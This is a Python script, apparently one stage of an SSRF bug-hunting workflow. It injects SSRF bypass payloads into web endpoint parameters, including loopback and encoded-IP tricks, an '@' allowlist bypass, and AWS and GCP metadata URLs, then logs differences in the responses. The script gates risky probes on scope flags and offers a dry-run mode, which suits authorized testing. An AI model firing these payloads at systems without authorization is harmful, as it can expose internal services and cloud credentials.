# -*- coding: utf-8 -*-
"""hunt-ssrf hunt 阶段：对每个入口按绕过族逐层试探，产出 candidates.json。

判定依据是**客观信号**（带外命中需你在 OAST 侧核对；响应差异/时间差异脚本可见），
不靠猜。脚本只生成并发送探测 payload、记录响应指标，真伪判定交给 validate + 人工。

用法:
  python hunt_ssrf.py --input recon/endpoints.json --output candidates.json --oast <domain> [--dry-run]

纪律：未在 scope 里 allow_internal/allow_metadata 的探测族会被跳过（除非 --force）。
"""
import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import log, load_json, save_json, http_probe  # noqa: E402

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def payload_families(oast):
    """返回 [(family, label, url, needs)] ；needs 标记该族要 scope 里放行的权限。"""
    return [
        ("oast", "带外基础确认", "http://%s/hunt-ssrf-probe" % oast, None),
        ("loopback", "loopback 直连", "http://127.0.0.1/", "internal"),
        ("ipv6", "IPv6 未指定地址", "http://[::]:80/", "internal"),
        ("altenc-decimal", "十进制 IP", "http://2130706433/", "internal"),
        ("altenc-octal", "八进制 IP", "http://0177.0.0.1/", "internal"),
        ("altenc-short", "短写 127.1", "http://127.1/", "internal"),
        ("metadata-aws", "AWS 元数据", "http://169.254.169.254/latest/meta-data/", "metadata"),
        ("metadata-gcp", "GCP v1beta1 元数据",
         "http://metadata.google.internal/computeMetadata/v1beta1/instance/", "metadata"),
        ("atsign", "@ 绕白名单", "http://%s@127.0.0.1/" % oast, "internal"),
    ]


def scope_flags():
    sp = os.path.join(ROOT, "evidence", "scope.txt")
    txt = ""
    if os.path.exists(sp):
        txt = open(sp, encoding="utf-8", errors="ignore").read().lower()
    return {
        "internal": "allow_internal: yes" in txt or "allow_internal:yes" in txt,
        "metadata": "allow_metadata: yes" in txt or "allow_metadata:yes" in txt,
    }


def build_probe_url(endpoint, payload_url):
    """把 payload 塞进入口参数；无参数则直接把 payload 作为目标（需人工确认注入点）。"""
    base = endpoint.get("url")
    param = endpoint.get("param")
    if param:
        sep = "&" if "?" in base else "?"
        from urllib.parse import quote
        return "%s%s%s=%s" % (base, sep, param, quote(payload_url, safe=""))
    return payload_url


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--input", required=True)
    ap.add_argument("--output", required=True)
    ap.add_argument("--oast", required=True, help="你的带外回连域名")
    ap.add_argument("--force", action="store_true", help="忽略 scope 放行标记（危险，仅授权明确时）")
    ap.add_argument("--dry-run", action="store_true", help="只打印将发的 payload，不真正请求")
    ap.add_argument("--max-time", type=int, default=8)
    args = ap.parse_args()

    data = load_json(args.input)
    if not data:
        sys.exit("读不到 %s，先跑 recon.sh" % args.input)
    endpoints = [e for e in data.get("endpoints", []) if e.get("controllable")]
    if not endpoints:
        log("无可控入口，全部记为 killed", "WARN")
        save_json(args.output, {"target": data.get("target"), "candidates": []})
        return

    flags = scope_flags()
    fams = payload_families(args.oast)
    candidates = []

    for ep in endpoints:
        # 先测该入口的"基线"响应，用于比对差异
        baseline = None if args.dry_run else http_probe(
            build_probe_url(ep, "http://%s/baseline" % args.oast), max_time=args.max_time)
        for family, label, purl, needs in fams:
            if needs and not flags.get(needs) and not args.force:
                log("跳过 %s（scope 未放行 %s）" % (family, needs))
                continue
            probe_url = build_probe_url(ep, purl)
            if args.dry_run:
                print("[dry-run] %s | %s | %s" % (ep.get("param"), family, probe_url))
                continue
            r = http_probe(probe_url, max_time=args.max_time)
            signal = []
            if r["stderr"] == "TIMEOUT":
                signal.append("timeout(可能内网挂起)")
            if baseline and r["status"] != baseline["status"]:
                signal.append("status差异 %s->%s" % (baseline["status"], r["status"]))
            if baseline and r["size"] != baseline["size"]:
                signal.append("size差异 %s->%s" % (baseline["size"], r["size"]))
            if family == "oast":
                signal.append("需在 OAST 侧核对是否收到回连")
            candidates.append({
                "endpoint": ep.get("url"), "param": ep.get("param"),
                "family": family, "label": label, "payload_url": purl,
                "probe_url": probe_url, "status": r["status"], "size": r["size"],
                "time": r["time"], "signal": signal or ["无明显信号"],
                "curl": r["cmd"],
            })

    save_json(args.output, {"target": data.get("target"),
                            "oast": args.oast, "candidates": candidates})
    log("生成候选 %d 条 -> %s（信号需 validate 复核，带外命中请查 OAST 日志）"
        % (len(candidates), args.output))


if __name__ == "__main__":
    main()
